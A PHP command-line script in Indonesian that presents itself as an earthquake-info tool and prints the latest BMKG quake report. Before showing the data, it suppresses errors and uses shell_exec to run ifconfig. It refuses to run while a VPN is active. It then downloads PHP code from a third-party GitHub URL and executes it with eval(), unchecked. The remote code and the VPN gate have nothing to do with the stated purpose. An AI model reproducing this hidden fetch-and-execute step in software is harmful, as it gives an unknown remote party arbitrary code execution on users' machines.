<?php
error_reporting(0);
// PERBAIKAN: Cek dulu apakah fungsi sudah ada sebelum mendefinisikan
if (!function_exists('kontol')) {
    function kontol(){
        $sistemm = shell_exec('2>/dev/null ifconfig');
        
        if (preg_match('/tun0/i', $sistemm)){
            echo "\033[1;34mUps Internet Mu Tidak Sehat\n";
            echo "Silakan Matikan Vpn Anda\n";
            exit;
        }
    }
}

// Panggil fungsi cek VPN
kontol();

const script = "Cek Gempa";

// AMBIL FILE LUAR
$function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku.php");

// (Opsional) Jika Anda curiga file luar itu juga punya fungsi 'kontol()' 
// dan menyebabkan error, Anda bisa membungkus eval dengan pengecekan error, 
// atau pastikan file curlku.php sudah aman.
eval($function);

// Panggil fungsi dari file luar
if (function_exists('bn')) {
    bn();
}

$url = "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json";

$json = file_get_contents($url);

if ($json === false) {
    exit("Gagal mengambil data.\n");
}

$data = json_decode($json, true);

if (!$data || !isset($data['Infogempa']['gempa'])) {
    exit("Data tidak valid.\n");
}

$g = $data['Infogempa']['gempa'];

echo "==============================\n";
echo "     GEMPA TERBARU BMKG\n";
echo "==============================\n";
echo "Tanggal      : {$g['Tanggal']}\n";
echo "Jam          : {$g['Jam']}\n";
echo "Magnitude    : {$g['Magnitude']}\n";
echo "Kedalaman    : {$g['Kedalaman']}\n";
echo "Lokasi       : {$g['Wilayah']}\n";
echo "Koordinat    : {$g['Coordinates']}\n";
echo "Potensi      : {$g['Potensi']}\n";
echo "Dirasakan    : {$g['Dirasakan']}\n";
echo "Shakemap     : https://data.bmkg.go.id/DataMKG/TEWS/{$g['Shakemap']}\n";
echo "==============================\n";